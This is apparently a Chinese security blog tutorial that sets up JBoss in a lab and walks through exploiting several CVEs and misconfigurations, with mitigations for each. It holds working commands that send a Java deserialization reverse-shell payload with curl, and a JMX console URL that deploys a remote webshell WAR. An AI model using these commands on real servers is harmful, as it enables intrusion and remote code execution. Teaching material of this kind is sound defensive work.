#  【超详细】JBoss中间件漏洞总结

亿人安全  [ LemonSec ](javascript:void\(0\);)

**LemonSec** ![]()

微信号 lemon-sec

功能介绍 Security for life

____

__

收录于话题

## 一.Jboss简介  

Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB
1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。

默认端口：8080

## 二.Jboss安装

下载地址：https://jbossas.jboss.org/downloads/

### 1.安装jdk

这里用了两台机子，一台安装老版本Jboss4，jdk选1.6，一台安装Jboss6.jdk选1.7

这里可以注意一下jboss5-7可以被jdk7支持，jboss4可以被jdk6支持；使用jdk8的话访问JMX-console会报500；

安装jdk步骤网上教程很多，我就不写了，这里已经装好。

![](https://gitee.com/fuli009/images/raw/master/public/20210830200949.png)image-20210819161330082![]()image-20210819161353705

### 2.下载并安装Jboss6

下载jboss-6.1.0.Final:

![](https://gitee.com/fuli009/images/raw/master/public/20210830200950.png)image-20210819150959561

将其拉入虚拟机c盘

![](https://gitee.com/fuli009/images/raw/master/public/20210830200951.png)image-20210820101410679

新建环境变量：

    
    
    JBOSS_HOME值为C:\jboss-6.1.0.Final  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830200953.png)image-20210820101555697

path中加入：

    
    
    ;%JBOSS_HOME%\bin;  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830200954.png)image-20210820101919780

在该目录下双击run.bat启动

    
    
    C:\jboss-6.1.0.Final\bin  
    

![]()image-20210820102031667

出现info即为启动成功，本地可成功访问。

![](https://gitee.com/fuli009/images/raw/master/public/20210830200955.png)image-20210820102615856

此时远程访问是访问不了的，我们需要修改C:\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml的配置实现外网访问。将address="${jboss.bind.address}"改成address="0.0.0.0"

![](https://gitee.com/fuli009/images/raw/master/public/20210830200956.png)image-20210820105055554

保存后重启jboss，即可实现外网访问；

image-20210820105424802

### 3.下载并安装Jboss4

Jboss4和Jboss6的安装步骤一样，唯一不同的是在外网访问的配置文件上修改的地方不太一样；

![](https://gitee.com/fuli009/images/raw/master/public/20210830200957.png)image-20210820135311614

进去下面目录，修改server.xml，如下图成功访问

    
    
    C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer  
    

![]()image-20210820135514710![](https://gitee.com/fuli009/images/raw/master/public/20210830200958.png)image-20210820135718708

## 三.Jboss渗透

### 1.Jboss5.x/6.x反序列化漏洞（CVE-2017-12149）

#### 漏洞原理

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的
ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了攻击者可以在服务器上执行任意代码。

#### 影响版本

    
    
    Jboss AS 5.x   
    Jboss AS 6.x  
    

#### 漏洞验证

访问/invoker/readonly，返回500（内部服务器错误——服务器端的CGI、ASP、JSP等程序发生错误），说明此页面存在反序列化漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20210830200959.png)image-20210820144055866

#### 漏洞复现

下载漏洞利用工具：https://github.com/joaomatosf/JavaDeserH2HC

![](https://gitee.com/fuli009/images/raw/master/public/20210830201000.png)image-20210823090347902

编译（需要java环境）

    
    
    cd /opt  
    curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz  
    tar zxvf jdk-8u20-linux-x64.tar.gz  
    rm -rf /usr/bin/java*  
    ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin  
    javac -version  
    java -version  
    

这里我已经安装好

![](https://gitee.com/fuli009/images/raw/master/public/20210830201001.png)image-20210820144519927

开启监听

![](https://gitee.com/fuli009/images/raw/master/public/20210830201002.png)image-20210820144803249

选择一个Gadget：ReverseShellCommonsCollectionsHashMap，编译并生成序列化数据；生成ReverseShellCommonsCollectionsHashMap.class；

    
    
    javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.ja  
    va  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201003.png)image-20210823090310580

生成序列化数据ReverseShellCommonsCollectionsHashMap.ser

    
    
    java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192  
    .168.10.65:12345  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201004.png)image-20210823090832540

利用ReverseShellCommonsCollectionsHashMap.ser，以二进制格式发送ReverseShellCommonsCollectionsHashMap.ser包

    
    
    curl http://192.168.10.154:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser  
    

![]()image-20210823091400586

成功反弹shell。

#### 安全防护

1.升级新版本。2.删除http-invoker.sar 组件，路径如下

    
    
    C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201005.png)image-20210823093407062

3.添加如下代码至 http-invoker.sar 下 web.xml的security-constraint 标签中,用于对 http invoker
组件进行访问控制。

    
    
    <url-pattern>/*</url-pattern>  
    

路径为：

    
    
    C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201006.png)image-20210823093730532![](https://gitee.com/fuli009/images/raw/master/public/20210830201007.png)image-20210823093707651

### 2.JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）

#### 漏洞原理

JBoss中/invoker/JMXInvokerServlet路径对外开放，JBoss的jmx组件支持反序列化。JBoss在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用Apache
Commons Collections中的Gadget执行任意代码。

#### 影响版本

    
    
    JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10  
    JBoss AS (Wildly) 6 and earlier  
    JBoss A-MQ 6.2.0  
    JBoss Fuse 6.2.0  
    JBoss SOA Platform (SOA-P) 5.3.1  
    JBoss Data Grid (JDG) 6.5.0  
    JBoss BRMS (BRMS) 6.1.0  
    JBoss BPMS (BPMS) 6.1.0  
    JBoss Data Virtualization (JDV) 6.1.0  
    JBoss Fuse Service Works (FSW) 6.0.0  
    JBoss Enterprise Web Server (EWS) 2.1,3.0  
    

#### 漏洞验证

    
    
    访问/invoker/JMXInvokerServlet，返回如下页面，说明接口开放，此接口存在反序列化漏洞。  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201008.png)image-20210823092835771

#### 漏洞复现

这里利用上面生成的序列化数据ReverseShellCommonsCollectionsHashMap.ser，发送到/invoker/JMXInvokerServlet接口中；

    
    
    curl http://192.168.10.154:8080/invoker/JMXInvokerServlet --data-binary @ReverseSh  
    ellCommonsCollectionsHashMap.ser  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201009.png)image-20210823093222160

成功反弹shell。

#### 安全防护

同上；

### 3.JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

#### 漏洞原理

这个漏洞与CVE-2015-7501一样，都是利用了Apache Commons
Collections的基础库进行Java反序列化漏洞的利用。差别在于CVE-2017-7504利用路径是/jbossmq-
httpil/HTTPServerILServlet，CVE-2015-7501的利用路径是/invoker/JMXInvokerServlet。

#### 影响版本

    
    
    Jboss AS 4.x及之前版本  
    

#### 漏洞验证

    
    
    访问/jbossmq-httpil/HTTPServerILServlet，出现如下页面，说明存在该漏洞  
    

![]()image-20210823094243623

#### 漏洞复现

这里利用上面生成好的序列化数据，发送到改接口中：

    
    
    curl http://192.168.10.213:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201010.png)image-20210823094553928

成功反弹shell

#### 安全防护

升级到最新版本。

### 4.JBoss EJBInvokerServlet 反序列化漏洞（CVE-2013-4810）

#### 漏洞原理

此漏洞和`CVE-2015-7501`漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中`JMXInvokerServlet`和`EJBInvokerServlet`利用的是`org.jboss.invocation.MarshalledValue`进行的反序列化操作，而`web-
console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造的文件。

#### 影响版本

    
    
     jboss 6.x 版本  
    

#### 漏洞验证

    
    
    访问/invoker/EJBInvokerServlet，如果可以访问的到，说明存在漏洞  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201011.png)image-20210823094955346

#### 漏洞复现

还是利用上面生成的.ser文件，通过POST 二进制数据上去，反向连接shell

    
    
    curl http://192.168.10.154:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201012.png)image-20210823095326056

### 5.Administration Console 弱口令

#### 漏洞原理

Administration Console管理页面存在弱口令，登录后台可以上传war包

#### 影响版本

#### 漏洞验证

![](https://gitee.com/fuli009/images/raw/master/public/20210830201013.png)![](https://gitee.com/fuli009/images/raw/master/public/20210830201014.png)image-20210823100247859

#### 漏洞复现

admin/admin弱口令登录,点击add a new resource上传war包

![](https://gitee.com/fuli009/images/raw/master/public/20210830201015.png)![](https://gitee.com/fuli009/images/raw/master/public/20210830201016.png)image-20210823104115380

点击war包进入下一层，若状态为stop，则点击start，默认都是start，不需要点。

![](https://gitee.com/fuli009/images/raw/master/public/20210830201017.png)image-20210823104345893

蚁剑成功连接

![]()image-20210823104524819

#### 安全防护

修改密码，密码文件路径为

    
    
    C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201018.png)

或者删除Administration Console页面

Jboss版本>=6.0,admin-console页面路径为

    
    
    C:\jboss-6.1.0.Final\common\deploy\admin-console.war  
    

6.0之前的版本，路径为

    
    
    C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war  
    

### 6.JMX Console未授权访问漏洞

#### 漏洞原理

访问控制不严导致的漏洞,默认情况下访问 `http://ip:8080/jmx-console` 就可以访问管理控制台，不需要输入用户名和密码就可以直接浏览
JBoss 的部署管理的信息，部署上传木马，存在安全隐患。

#### 影响版本

    
    
    JBOSS 全版本  
    

#### 漏洞验证

点击主页的JMX Console进入页面

![](https://gitee.com/fuli009/images/raw/master/public/20210830201019.png)

#### 漏洞复现

Jboss4.x的复现：

kali开启远程服务，为了下面部署war包

![](https://gitee.com/fuli009/images/raw/master/public/20210830201020.png)image-20210823115736527

进入JXM Console之后，找到jboss.deployment

![](https://gitee.com/fuli009/images/raw/master/public/20210830201021.png)image-20210823111537878

点进去找到void addURL(),输入远程war包链接之后，点击invoke

![]()image-20210823121654413

回到这个页面上方，点击Apply Changes

![](https://gitee.com/fuli009/images/raw/master/public/20210830201022.png)image-20210823121833925

返回到JMX Console页面，等待一会，刷新后可以看见部署成功

![](https://gitee.com/fuli009/images/raw/master/public/20210830201023.png)image-20210823122437357

蚁剑成功连接

![](https://gitee.com/fuli009/images/raw/master/public/20210830201024.png)image-20210823122620639

Jboss6.x的复现：

步骤差不多一样

![](https://gitee.com/fuli009/images/raw/master/public/20210830201025.png)image-20210823122818531![]()

在该页面找到methodindex为17or19的deploy，填写远程war包的地址进行远程部署

![](https://gitee.com/fuli009/images/raw/master/public/20210830201026.png)image-20210823130424900![](https://gitee.com/fuli009/images/raw/master/public/20210830201027.png)image-20210823130758283![](https://gitee.com/fuli009/images/raw/master/public/20210830201028.png)image-20210823130823043![](https://gitee.com/fuli009/images/raw/master/public/20210830201029.png)image-20210823131048341

或者是直接运行下面的语句部署即可

    
    
    http://192.168.10.154:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.syst  
    em:service=MainDeployer&methodIndex=17&arg0=http://192.168.10.65/shell.war  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201030.png)image-20210823131823568

蚁剑成功连接

![]()image-20210823131009567

部署的路径为如下，可以看见自动部署出war中的文件。

    
    
    C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201031.png)image-20210823131904293

#### 安全防护

关闭jmx-console和web-console，提高安全性。

### 7.JMX Console HtmlAdaptor Getshell利用（CVE-2007-1036）

#### 漏洞原理

此漏洞主要是由于`JBoss`中`/jmx-
console/HtmlAdaptor`路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能。

#### 影响版本

    
    
    Jboss4.x以下  
    

#### 漏洞复现

    
    
    输⼊url:http://192.168.10.213:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository定位到void store()  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210830201032.png)image-20210823133106427

分别向四个参数传入内容：

p1传入的部署war包的名字，p2传入的是上传文件的文件名，p3传入的是上传文件的格式，p4传入的是上传文件的内容

![](https://gitee.com/fuli009/images/raw/master/public/20210830201033.png)image-20210823134213929

点击invoke

![]()image-20210823134234176

经过测试，已经写入，但是目录底层不对，跳转不过去，无法上线蚁剑，这是个问题，暂时保留，有师傅有解决方法可以告诉我一下，万分感谢。

![](https://gitee.com/fuli009/images/raw/master/public/20210830201034.png)image-20210823142321972![](https://gitee.com/fuli009/images/raw/master/public/20210830201035.png)image-20210823135236215

#### 安全防护

目前官方已经发布了升级补丁以修复这个安全问题，请到官网的主页下载：http://cve.mitre.org/cgi-
bin/cvename.cgi?name=CVE-2007-1036

## 四.自动化渗透

#### jexboss自动化渗透

jexboss是针对jboss渗透自动化估计武器，是用于测试和利用JBoss Application
Server和其他java平台、框架、应用程序等中的漏洞的工具。

下载地址：https://github.com/joaomatosf/jexboss

这里演示的环境是我上面搭建的4.x和6.x的环境。

输入命令

    
    
    python jexboss.py -host http://192.168.10.213:8080/  
    

输入yes即可

![]()image-20210823141601720![](https://gitee.com/fuli009/images/raw/master/public/20210830201036.png)image-20210823141649693

成功交互。

  * 

    
    
    文章来源：亿人安全

\---》  

 **强烈推荐：**

 **     每日发布 红队攻防技术文章、蓝队防守技术文章、ctf安全赛事技术文章、安全运维基线文章、以及不定期的安全类书籍抽奖～**

![](https://gitee.com/fuli009/images/raw/master/public/20210830201037.png)
****

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

【超详细】JBoss中间件漏洞总结

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

